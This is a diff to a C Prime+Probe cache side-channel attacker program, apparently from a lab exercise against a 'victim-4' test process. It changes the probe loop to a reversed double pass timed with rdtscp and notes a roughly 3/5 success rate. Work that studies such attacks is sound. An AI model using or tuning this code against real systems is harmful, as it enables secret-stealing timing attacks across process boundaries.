@@ -45,8 +45,9 @@ void shuffle(int *arr) {
 }
 
 int main() {
-    /* works around 2/3 of time on victim-4. Randomize access, reverse probe, no usleep. High synchornization required for this version
+    /* works around 3/5 of time on victim-4. Randomize access, reverse double probe, no usleep. High synchornization required for this version
     */
+   /* REVERSE PROBING*/
     printf("Attacker ready. Prime+Probe starting...\n");
     /*test wait cycles for victim*/
     wait_cycles(2000000);
@@ -101,15 +102,21 @@ int main() {
                 wait_cycles(5000);
 
                 /* PROBE this set */
-                uint64_t start = rdtscp();
 
-                for(int w = 0; w < WAYS; w++) {
-                    tmp ^= *eviction_sets[set][w];
+                uint64_t latency = 0;
+
+                for(int r = 0; r < 2; r++) {
+                    uint64_t start = rdtscp();
+
+                    for(int w = WAYS - 1; w >= 0; w--) {
+                        tmp ^= *eviction_sets[set][w];
+                    }
+
+                    uint64_t end = rdtscp();
+                    latency += (end - start);
                 }
 
-                uint64_t end = rdtscp();
-
-                scores[set] += (end - start);
+                scores[set] += latency;
             }
         }
         int best_set = 0;
